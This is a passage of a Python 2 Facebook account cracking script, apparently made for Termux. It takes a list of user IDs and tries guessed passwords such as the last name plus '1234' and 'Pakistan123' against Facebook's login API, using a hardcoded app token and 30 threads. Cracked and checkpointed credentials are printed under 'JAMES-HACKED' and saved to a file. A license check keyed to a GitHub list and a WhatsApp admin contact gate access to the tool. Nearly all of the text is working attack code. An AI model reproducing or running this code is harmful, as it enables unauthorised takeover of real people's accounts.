                            print '\x1c\x1b[1;94m[\xe2\x9e\xb9] \x1c\x1b[1;94mID \x1c\x1b[1;94m      : \x1c\x1b[1;95m' + user
                            print '\x1c\x1b[1;94m[\xe2\x9e\xb9] \x1c\x1b[1;94mPassword \x1c\x1b[1;94m: \x1c\x1b[1;95m' + pass4 + '\n'
                            print '\x1c\x1b[1;97m[\xe2\x9e\xb9] \x1c\x1b[1;91mTanggal Lahir \x1c\x1b[1;91m: \x1c\x1b[1;92m' + c['birthday']
                            cek = open('out/super_cp.txt', 'a')
                            cek.write('ID:' + user + ' Pw:' + pass4 + '\n')
                            cek.close()
                            cekpoint.append(user + pass4)
                        else:
                            pass5 = c['last_name'] + '1234'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            w = json.load(data)
                            if 'access_token' in w:
                                x = requests.get('https://graph.facebook.com/' + user + '?access_token=' + w['access_token'])
                                z = json.loads(x.text)
                                print '\x1c\x1b[1;94m[\xe2\x9c\x94] \x1c\x1b[1;92m[JAMES-HACKED] '
                                print '\x1c\x1b[1;94m[\xe2\x9e\xb9] \x1c\x1b[1;91mName \x1c\x1b[1;91m    : \x1c\x1b[1;92m' + c['name']
                                print '\x1c\x1b[1;94m[\xe2\x9e\xb9] \x1c\x1b[1;91mID \x1c\x1b[1;91m      : \x1c\x1b[1;92m' + user
                                print '\x1c\x1b[1;94m[\xe2\x9e\xb9] \x1c\x1b[1;94mPassword \x1c\x1b[1;94m: \x1c\x1b[1;95m' + pass5 + '\n'
                                print '\x1c\x1b[1;97m[\xe2\x9e\xb9] \x1c\x1b[1;91mTanggal Lahir \x1c\x1b[1;91m: \x1c\x1b[1;92m' + c['birthday']
                                oks.append(user + pass5)
                            elif 'www.facebook.com' in w['error_msg']:
                                print '\x1c\x1b[1;94m[\xe2\x9c\x96] \x1c\x1b[1;94m[JAMES-CP]'
                                print '\x1c\x1b[1;94m[\xe2\x9e\xb9] \x1c\x1b[1;94mName \x1c\x1b[1;94m    : \x1c\x1b[1;95m' + c['name']
                                print '\x1c\x1b[1;94m[\xe2\x9e\xb9] \x1c\x1b[1;94mID \x1c\x1b[1;94m      : \x1c\x1b[1;95m' + user
                                print '\x1c\x1b[1;94m[\xe2\x9e\xb9] \x1c\x1b[1;94mPassword \x1c\x1b[1;94m: \x1c\x1b[1;95m' + pass5 + '\n'
                                print '\x1c\x1b[1;97m[\xe2\x9e\xb9] \x1c\x1b[1;91mTanggal Lahir \x1c\x1b[1;91m: \x1c\x1b[1;92m' + c['birthday']
                                cek = open('out/super_cp.txt', 'a')
                                cek.write('ID:' + user + ' Pw:' + pass5 + '\n')
                                cek.close()
                                cekpoint.append(user + pass5)
                            else:
                                pass6 = c['last_name'] + '12345'
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                w = json.load(data)
                                if 'access_token' in w:
                                    x = requests.get('https://graph.facebook.com/' + user + '?access_token=' + w['access_token'])
                                    z = json.loads(x.text)
                                    print '\x1c\x1b[1;94m[\xe2\x9c\x94] \x1c\x1b[1;92m[JAMES-HACKED] '
                                    print '\x1c\x1b[1;94m[\xe2\x9e\xb9] \x1c\x1b[1;91mName \x1c\x1b[1;91m    : \x1c\x1b[1;92m' + c['name']
                                    print '\x1c\x1b[1;94m[\xe2\x9e\xb9] \x1c\x1b[1;91mID \x1c\x1b[1;91m      : \x1c\x1b[1;92m' + user
                                    print '\x1c\x1b[1;94m[\xe2\x9e\xb9] \x1c\x1b[1;94mPassword \x1c\x1b[1;94m: \x1c\x1b[1;95m' + pass6 + '\n'
                                    print '\x1c\x1b[1;97m[\xe2\x9e\xb9] \x1c\x1b[1;91mTanggal Lahir \x1c\x1b[1;91m: \x1c\x1b[1;92m' + c['birthday']
                                    oks.append(user + pass6)
                                elif 'www.facebook.com' in w['error_msg']:
                                    print '\x1c\x1b[1;94m[\xe2\x9c\x96] \x1c\x1b[1;94m[JAMES-CP]'
                                    print '\x1c\x1b[1;94m[\xe2\x9e\xb9] \x1c\x1b[1;94mName \x1c\x1b[1;94m    : \x1c\x1b[1;95m' + c['name']
                                    print '\x1c\x1b[1;94m[\xe2\x9e\xb9] \x1c\x1b[1;94mID \x1c\x1b[1;94m      : \x1c\x1b[1;95m' + user
                                    print '\x1c\x1b[1;94m[\xe2\x9e\xb9] \x1c\x1b[1;94mPassword \x1c\x1b[1;94m: \x1c\x1b[1;95m' + pass6 + '\n'
                                    print '\x1c\x1b[1;97m[\xe2\x9e\xb9] \x1c\x1b[1;91mTanggal Lahir \x1c\x1b[1;91m: \x1c\x1b[1;92m' + c['birthday']
                                    cek = open('out/super_cp.txt', 'a')
                                    cek.write('ID:' + user + ' Pw:' + pass6 + '\n')
                                    cek.close()
                                    cekpoint.append(user + pass6)
                                else:
                                    pass7 = '786786'
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    w = json.load(data)
                                    if 'access_token' in w:
                                        x = requests.get('https://graph.facebook.com/' + user + '?access_token=' + w['access_token'])
                                        z = json.loads(x.text)
                                        print '\x1c\x1b[1;94m[\xe2\x9c\x94] \x1c\x1b[1;92m[JAMES-HACKED] '
                                        print '\x1c\x1b[1;94m[\xe2\x9e\xb9] \x1c\x1b[1;91mName \x1c\x1b[1;91m    : \x1c\x1b[1;92m' + c['name']
                                        print '\x1c\x1b[1;94m[\xe2\x9e\xb9] \x1c\x1b[1;94mID \x1c\x1b[1;94m      : \x1c\x1b[1;95m' + user
                                        print '\x1c\x1b[1;94m[\xe2\x9e\xb9] \x1c\x1b[1;94mPassword \x1c\x1b[1;94m: \x1c\x1b[1;95m' + pass7 + '\n'
                                        print '\x1c\x1b[1;97m[\xe2\x9e\xb9] \x1c\x1b[1;91mTanggal Lahir \x1c\x1b[1;91m: \x1c\x1b[1;92m' + c['birthday']
                                        oks.append(user + pass7)
                                    elif 'www.facebook.com' in w['error_msg']:
                                        print '\x1c\x1b[1;94m[\xe2\x9c\x96] \x1c\x1b[1;94m[JAMES-CP]'
                                        print '\x1c\x1b[1;94m[\xe2\x9e\xb9] \x1c\x1b[1;94mName \x1c\x1b[1;94m    : \x1c\x1b[1;95m' + c['name']
                                        print '\x1c\x1b[1;94m[\xe2\x9e\xb9] \x1c\x1b[1;94mID \x1c\x1b[1;94m      : \x1c\x1b[1;95m' + user
                                        print '\x1c\x1b[1;94m[\xe2\x9e\xb9] \x1c\x1b[1;94mPassword \x1c\x1b[1;94m: \x1c\x1b[1;95m' + pass7 + '\n'
                                        print '\x1c\x1b[1;97m[\xe2\x9e\xb9] \x1c\x1b[1;91mTanggal Lahir \x1c\x1b[1;91m: \x1c\x1b[1;92m' + c['birthday']
                                        cek = open('out/super_cp.txt', 'a')
                                        cek.write('ID:' + user + ' Pw:' + pass7 + '\n')
                                        cek.close()
                                        cekpoint.append(user + pass7)
                                    else:
                                        pass8 = 'Pakistan123'
                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                        w = json.load(data)
                                        if 'access_token' in w:
                                            x = requests.get('https://graph.facebook.com/' + user + '?access_token=' + w['access_token'])
                                            z = json.loads(x.text)
                                            print '\x1c\x1b[1;94m[\xe2\x9c\x94] \x1c\x1b[1;92m[JAMES-HACKED] '
                                            print '\x1c\x1b[1;94m[\xe2\x9e\xb9] \x1c\x1b[1;91mName \x1c\x1b[1;91m    : \x1c\x1b[1;92m' + c['name']
                                            print '\x1c\x1b[1;94m[\xe2\x9e\xb9] \x1c\x1b[1;94mID \x1c\x1b[1;94m      : \x1c\x1b[1;95m' + user
                                            print '\x1c\x1b[1;94m[\xe2\x9e\xb9] \x1c\x1b[1;94mPassword \x1c\x1b[1;94m: \x1c\x1b[1;95m' + pass8 + '\n'
                                            print '\x1c\x1b[1;97m[\xe2\x9e\xb9] \x1c\x1b[1;91mTanggal Lahir \x1c\x1b[1;91m: \x1c\x1b[1;92m' + c['birthday']
                                            oks.append(user + pass8)
                                        elif 'www.facebook.com' in w['error_msg']:
                                            print '\x1c\x1b[1;94m[\xe2\x9c\x96] \x1c\x1b[1;94m[JAMES-CP]'
                                            print '\x1c\x1b[1;94m[\xe2\x9e\xb9] \x1c\x1b[1;94mName \x1c\x1b[1;94m    : \x1c\x1b[1;95m' + c['name']
                                            print '\x1c\x1b[1;94m[\xe2\x9e\xb9] \x1c\x1b[1;94mID \x1c\x1b[1;94m      : \x1c\x1b[1;95m' + user
                                            print '\x1c\x1b[1;94m[\xe2\x9e\xb9] \x1c\x1b[1;94mPassword \x1c\x1b[1;94m: \x1c\x1b[1;95m' + pass8 + '\n'
                                            print '\x1c\x1b[1;97m[\xe2\x9e\xb9] \x1c\x1b[1;91mTanggal Lahir \x1c\x1b[1;91m: \x1c\x1b[1;92m' + c['birthday']
                                            cek = open('out/super_cp.txt', 'a')
                                            cek.write('ID:' + user + ' Pw:' + pass8 + '\n')
                                            cek.close()
                                            cekpoint.append(user + pass8)
                                        else:
                                            pass9 = '102030'
                                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass9 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                            w = json.load(data)
                                            if 'access_token' in w:
                                                x = requests.get('https://graph.facebook.com/' + user + '?access_token=' + w['access_token'])
                                                z = json.loads(x.text)
                                                print '\x1c\x1b[1;94m[\xe2\x9c\x94] \x1c\x1b[1;92m[JAMES-HACKED] '
                                                print '\x1c\x1b[1;94m[\xe2\x9e\xb9] \x1c\x1b[1;91mName \x1c\x1b[1;91m    : \x1c\x1b[1;92m' + c['name']
                                                print '\x1c\x1b[1;94m[\xe2\x9e\xb9] \x1c\x1b[1;94mID \x1c\x1b[1;94m      : \x1c\x1b[1;95m' + user
                                                print '\x1c\x1b[1;94m[\xe2\x9e\xb9] \x1c\x1b[1;94mPassword \x1c\x1b[1;94m: \x1c\x1b[1;95m' + pass9 + '\n'
                                                print '\x1c\x1b[1;97m[\xe2\x9e\xb9] \x1c\x1b[1;91mTanggal Lahir \x1c\x1b[1;91m: \x1c\x1b[1;92m' + c['birthday']
                                                oks.append(user + pass9)
                                            elif 'www.facebook.com' in w['error_msg']:
                                                print '\x1c\x1b[1;94m[\xe2\x9c\x96] \x1c\x1b[1;94m[JAMES-CP]'
                                                print '\x1c\x1b[1;94m[\xe2\x9e\xb9] \x1c\x1b[1;94mName \x1c\x1b[1;94m    : \x1c\x1b[1;95m' + c['name']
                                                print '\x1c\x1b[1;94m[\xe2\x9e\xb9] \x1c\x1b[1;94mID \x1c\x1b[1;94m      : \x1c\x1b[1;95m' + user
                                                print '\x1c\x1b[1;94m[\xe2\x9e\xb9] \x1c\x1b[1;94mPassword \x1c\x1b[1;94m: \x1c\x1b[1;95m' + pass9 + '\n'
                                                print '\x1c\x1b[1;97m[\xe2\x9e\xb9] \x1c\x1b[1;91mTanggal Lahir \x1c\x1b[1;91m: \x1c\x1b[1;92m' + c['birthday']
                                                cek = open('out/super_cp.txt', 'a')
                                                cek.write('ID:' + user + ' Pw:' + pass9 + '\n')
                                                cek.close()
                                                cekpoint.append(user + pass9)
                                            else:
                                                pass10 = '778899'
                                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass10 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                w = json.load(data)
                                                if 'access_token' in w:
                                                    x = requests.get('https://graph.facebook.com/' + user + '?access_token=' + w['access_token'])
                                                    z = json.loads(x.text)
                                                    print '\x1c\x1b[1;94m[\xe2\x9c\x94] \x1c\x1b[1;92m[JAMES-HACKED] '
                                                    print '\x1c\x1b[1;94m[\xe2\x9e\xb9] \x1c\x1b[1;91mName \x1c\x1b[1;91m    : \x1c\x1b[1;92m' + c['name']
                                                    print '\x1c\x1b[1;94m[\xe2\x9e\xb9] \x1c\x1b[1;94mID \x1c\x1b[1;94m      : \x1c\x1b[1;95m' + user
                                                    print '\x1c\x1b[1;94m[\xe2\x9e\xb9] \x1c\x1b[1;94mPassword \x1c\x1b[1;94m: \x1c\x1b[1;95m' + pass10 + '\n'
                                                    print '\x1c\x1b[1;97m[\xe2\x9e\xb9] \x1c\x1b[1;91mTanggal Lahir \x1c\x1b[1;91m: \x1c\x1b[1;92m' + c['birthday']
                                                    oks.append(user + pass10)
                                                elif 'www.facebook.com' in w['error_msg']:
                                                    print '\x1c\x1b[1;94m[\xe2\x9c\x96] \x1c\x1b[1;94m[JAMES-CP]'
                                                    print '\x1c\x1b[1;94m[\xe2\x9e\xb9] \x1c\x1b[1;94mName \x1c\x1b[1;94m    : \x1c\x1b[1;95m' + c['name']
                                                    print '\x1c\x1b[1;94m[\xe2\x9e\xb9] \x1c\x1b[1;94mID \x1c\x1b[1;94m      : \x1c\x1b[1;95m' + user
                                                    print '\x1c\x1b[1;94m[\xe2\x9e\xb9] \x1c\x1b[1;94mPassword \x1c\x1b[1;94m: \x1c\x1b[1;95m' + pass10 + '\n'
                                                    print '\x1c\x1b[1;97m[\xe2\x9e\xb9] \x1c\x1b[1;91mTanggal Lahir \x1c\x1b[1;91m: \x1c\x1b[1;92m' + c['birthday']
                                                    cek = open('out/super_cp.txt', 'a')
                                                    cek.write('ID:' + user + ' Pw:' + pass10 + '\n')
                                                    cek.close()
                                                    cekpoint.append(user + pass10)
                                                else:
                                                    pass11 = 'Bangladesh123'
                                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass11 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                    w = json.load(data)
                                                    if 'access_token' in w:
                                                        x = requests.get('https://graph.facebook.com/' + user + '?access_token=' + w['access_token'])
                                                        z = json.loads(x.text)
                                                        print '\x1c\x1b[1;94m[\xe2\x9c\x94] \x1c\x1b[1;92m[JAMES-HACKED] '
                                                        print '\x1c\x1b[1;94m[\xe2\x9e\xb9] \x1c\x1b[1;91mName \x1c\x1b[1;91m    : \x1c\x1b[1;92m' + c['name']
                                                        print '\x1c\x1b[1;94m[\xe2\x9e\xb9] \x1c\x1b[1;94mID \x1c\x1b[1;94m      : \x1c\x1b[1;95m' + user
                                                        print '\x1c\x1b[1;94m[\xe2\x9e\xb9] \x1c\x1b[1;94mPassword \x1c\x1b[1;94m: \x1c\x1b[1;95m' + pass11 + '\n'
                                                        print '\x1c\x1b[1;97m[\xe2\x9e\xb9] \x1c\x1b[1;91mTanggal Lahir \x1c\x1b[1;91m: \x1c\x1b[1;92m' + c['birthday']
                                                        oks.append(user + pass11)
                                                    elif 'www.facebook.com' in w['error_msg']:
                                                        print '\x1c\x1b[1;94m[\xe2\x9c\x96] \x1c\x1b[1;94m[JAMES-CP]'
                                                        print '\x1c\x1b[1;94m[\xe2\x9e\xb9] \x1c\x1b[1;94mName \x1c\x1b[1;94m    : \x1c\x1b[1;95m' + c['name']
                                                        print '\x1c\x1b[1;94m[\xe2\x9e\xb9] \x1c\x1b[1;94mID \x1c\x1b[1;94m      : \x1c\x1b[1;95m' + user
                                                        print '\x1c\x1b[1;94m[\xe2\x9e\xb9] \x1c\x1b[1;94mPassword \x1c\x1b[1;94m: \x1c\x1b[1;95m' + pass11 + '\n'
                                                        print '\x1c\x1b[1;97m[\xe2\x9e\xb9] \x1c\x1b[1;91mTanggal Lahir \x1c\x1b[1;91m: \x1c\x1b[1;92m' + c['birthday']
                                                        cek = open('out/super_cp.txt', 'a')
                                                        cek.write('ID:' + user + ' Pw:' + pass11 + '\n')
                                                        cek.close()
                                                        cekpoint.append(user + pass11)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\x1b[1;34m\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88'
    print '\x1b[1;97m[\x1b[1;93m\xe2\x9c\x94\x1b[1;97m] \x1b[1;92mDone ....'
    print '\x1b[1;97m[\x1b[1;93m\xe2\x9e\xb9\x1b[1;97m] \x1b[1;92mTotal \x1b[1;92mOK\x1b[1;97m/\x1b[1;93mCP \x1b[1;97m: \x1b[1;92m' + str(len(oks)) + '\x1b[1;97m/\x1b[1;93m' + str(len(cekpoint))
    print '\x1b[1;97m[\x1b[1;93m\xe2\x9e\xb9\x1b[1;97m] \x1b[1;92mmCP file Save : out/James.txt'
    print '\x1b[1;34m\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88'
    raw_input('\x1b[1;93m[\x1b[1;97m Back \x1b[1;93m]')
    os.system('python2 Testing.py')


def spt():
    try:
        toket = open('license.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] License Invalid !'
        os.system('clear')
        os.system('rm -rf license.txt')
        user()

    if os.path.exists('license.txt'):
        user1()
    else:
        user()


def user():
    os.system('clear')
    print logo
    print 50 * '\x1b[1;94m-'
    print '\x1b[1;97m[\x1b[1;92m\xe2\x9c\x93\x1b[1;97m] Generating ID ...'
    time.sleep(3)
    print '\x1b[1;97m[\x1b[1;92m\xe2\x9c\x93\x1b[1;97m] ID Generating Success'
    id = uuid.uuid4().hex[:25]
    idg = open('license.txt', 'w')
    idg.write(id)
    idg.close()
    print '\x1b[1;31;1m[\x1b[1;92m+\x1b[1;92m] ID : \x1b[1;31;1m' + id
    print '\x1b[1;31;1m[\x1b[1;92m\xe2\x9c\x93\x1b[1;92m] Successfully'
    print '\x1b[1;31;1m[\x1b[1;92m\xe2\x9c\x93\x1b[1;92m] Your ID Has Not Been Confirmed'
    print '\x1b[1;31;1m[\x1b[1;94m\xe2\x80\xa2\x1b[1;92m] Please Contact Admin for ID Confirmation'
    raw_input('\x1b[1;97m[\x1b[1;94m>\x1b[1;97m] Press Enter to Chat Admin')
    os.system('am start https://wa.me/96598064347?text=Confirm%20My%20ID%20License:%20' + id + ' >/dev/null')
    time.sleep(1)
    os.sys.exit()


def user1():
    try:
        j = open('license.txt', 'r').read()
        r = requests.get('https://raw.githubusercontent.com/Eva1010/OS/main/JJJJJ/public/id.txt').text
        if j in r:
            os.system('clear')
            print logo
            print 50 * '\x1b[1;94m-'
            print '\x1b[1;97m[\x1b[1;92m\xe2\x9c\x93\x1b[1;97m] Login Status\x1b[1;91m :\x1b[1;92m Complete'
            menu()
        else:
            os.system('clear')
            print logo
            print 50 * '\x1b[1;94m-'
            print '\x1b[1;31;1m[\x1b[1;92m\xe2\x9c\x93\x1b[1;92m] Login Status : \x1b[1;31;1mFailed\x1b[1;39m'
            print '\x1b[1;31;1m[\x1b[1;94m\xe2\x80\xa2\x1b[1;92m] ID Not Confirmed\x1b[1;39m'
            print '\x1b[1;31;1m[\x1b[1;94m\xe2\x80\xa2\x1b[1;92m] Please Chat Admin For Confirmed Your ID\x1b[1;39m'
            raw_input('\x1b[1;31;1m[\x1b[1;94m>\x1b[1;92m] Press Enter To Chat Admin\x1b[1;39m')
            os.system('am start https://wa.me/96598064347?text=Confirm%20My%20ID%20License:%20' + j + ' >/dev/null')
            os.sys.exit()
    except requests.exceptions.ConnectionError:
        print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] No Connection'
        raw_input('\x1b[1;97m[\x1b[1;92m>\x1b[1;97m] Back')
        spt()
    except KeyboardInterrupt:
        os.sys.exit()
    except IOError:
        subprocess.Popen(['rm', '-rf', 'license.txt'])
        user()


if __name__ == '__main__':
    spt()